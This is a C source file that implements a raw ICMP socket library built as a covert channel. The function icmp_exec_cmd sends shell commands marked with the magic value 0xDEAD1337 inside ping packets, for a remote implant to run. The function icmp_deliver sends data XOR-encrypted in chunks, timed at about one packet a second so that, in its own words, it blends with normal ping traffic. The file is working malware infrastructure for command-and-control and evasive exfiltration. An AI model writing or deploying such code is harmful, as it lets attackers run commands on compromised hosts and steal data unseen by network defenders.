/*
 * icmp.c — raw ICMP socket wrapper implementation
 */

#define _DEFAULT_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <netinet/ip.h>
#include <netinet/in.h>
#include <netinet/ip_icmp.h>
#include <stdint.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <unistd.h>

#include "icmp.h"

/* ------------------------------------------------------------------ */
/* Internal helpers                                                     */
/* ------------------------------------------------------------------ */

/*
 * checksum(data, len)
 *   Standard internet checksum (RFC 1071).
 */
static uint16_t checksum(const void *data, size_t len)
{
    const uint16_t *ptr = (const uint16_t *)data;
    uint32_t sum = 0;

    while (len > 1)
    {
        sum += *ptr++;
        len -= 2;
    }
    if (len == 1)
        sum += *(const uint8_t *)ptr;

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (uint16_t)(~sum);
}

/* ------------------------------------------------------------------ */
/* Public API                                                           */
/* ------------------------------------------------------------------ */

int icmp_open(icmp_ctx_t *ctx)
{
    if (!ctx)
        return -1;

    ctx->sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (ctx->sock < 0)
        return -1;

    /* Use PID as session id so concurrent instances don't collide */
    ctx->id = (uint16_t)getpid();
    ctx->seq = 0;
    return 0;
}

int icmp_send(icmp_ctx_t *ctx, const char *dst,
              const uint8_t *payload, size_t len)
{
    struct sockaddr_in addr;
    uint8_t pkt[sizeof(struct icmphdr) + ICMP_PAYLOAD_MAX];
    struct icmphdr *hdr = (struct icmphdr *)pkt;
    size_t pkt_len;

    if (!ctx || !dst || (!payload && len > 0))
        return -1;
    if (len > ICMP_PAYLOAD_MAX)
        len = ICMP_PAYLOAD_MAX;

    pkt_len = sizeof(struct icmphdr) + len;
    memset(pkt, 0, pkt_len);

    hdr->type = ICMP_ECHO_REQUEST;
    hdr->code = 0;
    hdr->un.echo.id = htons(ctx->id);
    hdr->un.echo.sequence = htons(ctx->seq++);

    if (payload && len > 0)
        memcpy(pkt + sizeof(struct icmphdr), payload, len);

    hdr->checksum = checksum(pkt, pkt_len);

    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    if (inet_pton(AF_INET, dst, &addr.sin_addr) != 1)
        return -1;

    if (sendto(ctx->sock, pkt, pkt_len, 0,
               (struct sockaddr *)&addr, sizeof(addr)) < 0)
        return -1;

    return 0;
}

int icmp_recv(icmp_ctx_t *ctx, char *src_out,
              uint8_t *buf, size_t buf_len, int timeout_ms)
{
    struct timeval tv;
    uint8_t raw[1500];
    struct sockaddr_in from;
    socklen_t from_len = sizeof(from);
    ssize_t n;
    struct ip *ip_hdr;
    struct icmphdr *icmp_hdr;
    size_t ip_hdr_len;
    size_t payload_len;

    if (!ctx || !buf || buf_len == 0)
        return -1;

    /* set receive timeout */
    tv.tv_sec = timeout_ms / 1000;
    tv.tv_usec = (timeout_ms % 1000) * 1000;
    if (setsockopt(ctx->sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv)) < 0)
        return -1;

    do
    {
        n = recvfrom(ctx->sock, raw, sizeof(raw), 0,
                     (struct sockaddr *)&from, &from_len);
        if (n < 0)
            return -1;

        ip_hdr = (struct ip *)raw;
        ip_hdr_len = (size_t)(ip_hdr->ip_hl) * 4;

        if ((size_t)n < ip_hdr_len + sizeof(struct icmphdr))
            continue;

        icmp_hdr = (struct icmphdr *)(raw + ip_hdr_len);

    } while (icmp_hdr->type != ICMP_ECHO_REPLY ||
             ntohs(icmp_hdr->un.echo.id) != ctx->id);

    /* copy payload */
    payload_len = (size_t)n - ip_hdr_len - sizeof(struct icmphdr);
    if (payload_len > buf_len)
        payload_len = buf_len;
    memcpy(buf, raw + ip_hdr_len + sizeof(struct icmphdr), payload_len);

    /* fill sender IP string if requested */
    if (src_out)
        inet_ntop(AF_INET, &from.sin_addr, src_out, INET_ADDRSTRLEN);

    return (int)payload_len;
}

int icmp_exec_cmd(icmp_ctx_t *ctx, const char *dst, const char *cmd)
{
    struct sockaddr_in addr;
    uint8_t pkt[sizeof(struct icmphdr) + 4 + ICMP_EXEC_CMD_MAX];
    struct icmphdr *hdr = (struct icmphdr *)pkt;
    uint32_t magic = htonl(0xDEAD1337u);
    size_t cmd_len;
    size_t pkt_len;

    if (!ctx || !dst || !cmd)
        return -1;

    cmd_len = strlen(cmd);
    if (cmd_len >= ICMP_EXEC_CMD_MAX)
        cmd_len = ICMP_EXEC_CMD_MAX - 1;

    pkt_len = sizeof(struct icmphdr) + 4 + cmd_len;
    memset(pkt, 0, pkt_len);

    hdr->type             = ICMP_ECHO_REQUEST;
    hdr->code             = 0;
    hdr->un.echo.id       = htons(ctx->id);
    hdr->un.echo.sequence = htons(ctx->seq++);

    memcpy(pkt + sizeof(struct icmphdr), &magic, 4);
    memcpy(pkt + sizeof(struct icmphdr) + 4, cmd, cmd_len);

    hdr->checksum = checksum(pkt, pkt_len);

    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    if (inet_pton(AF_INET, dst, &addr.sin_addr) != 1)
        return -1;

    if (sendto(ctx->sock, pkt, pkt_len, 0,
               (struct sockaddr *)&addr, sizeof(addr)) < 0)
        return -1;

    return 0;
}

void icmp_close(icmp_ctx_t *ctx)
{
    if (ctx && ctx->sock >= 0)
    {
        close(ctx->sock);
        ctx->sock = -1;
    }
}

/**
 * @brief Deliver a large buffer covertly over ICMP echo.
 *
 * Splits @p buf into ICMP_CHUNK_DATA-byte chunks. Each packet carries a
 * 4-byte header [total_chunks(2)][chunk_index(2)] followed by the data
 * XOR-encrypted byte-by-byte with @p key. Packets are sent at ~1 Hz to
 * blend with normal ping traffic. Uses stop-and-wait: waits for each echo
 * reply before sending the next chunk.
 *
 * @param ctx   Initialised ICMP context.
 * @param dst   Destination IP address string.
 * @param buf   Buffer to deliver.
 * @param len   Size of buf in bytes.
 * @param key   XOR session key applied to each data byte.
 * @return      0 when all chunks acknowledged, -1 on error.
 */
int icmp_deliver(icmp_ctx_t *ctx, const char *dst,
                 const uint8_t *buf, size_t len, uint8_t key)
{
    uint8_t  pkt[ICMP_PAYLOAD_MAX];
    uint8_t  reply[ICMP_PAYLOAD_MAX];
    uint16_t total;
    uint16_t idx;
    size_t   offset;
    size_t   chunk_len;
    size_t   i;

    total = (uint16_t)((len + ICMP_CHUNK_DATA - 1) / ICMP_CHUNK_DATA);

    for (idx = 0; idx < total; idx++) {
        offset    = (size_t)idx * ICMP_CHUNK_DATA;
        chunk_len = len - offset;
        if (chunk_len > ICMP_CHUNK_DATA)
            chunk_len = ICMP_CHUNK_DATA;

        /* 4-byte header: [total(2 BE)][index(2 BE)] */
        pkt[0] = (uint8_t)(total >> 8);
        pkt[1] = (uint8_t)(total & 0xff);
        pkt[2] = (uint8_t)(idx >> 8);
        pkt[3] = (uint8_t)(idx & 0xff);

        /* XOR-encrypt payload */
        for (i = 0; i < chunk_len; i++)
            pkt[4 + i] = buf[offset + i] ^ key;

        if (icmp_send(ctx, dst, pkt, 4 + chunk_len) < 0)
            return -1;

        /* wait for reply before sending next chunk (~1 Hz) */
        icmp_recv(ctx, NULL, reply, sizeof(reply), 1200);

        sleep(1);
    }

    return 0;
}
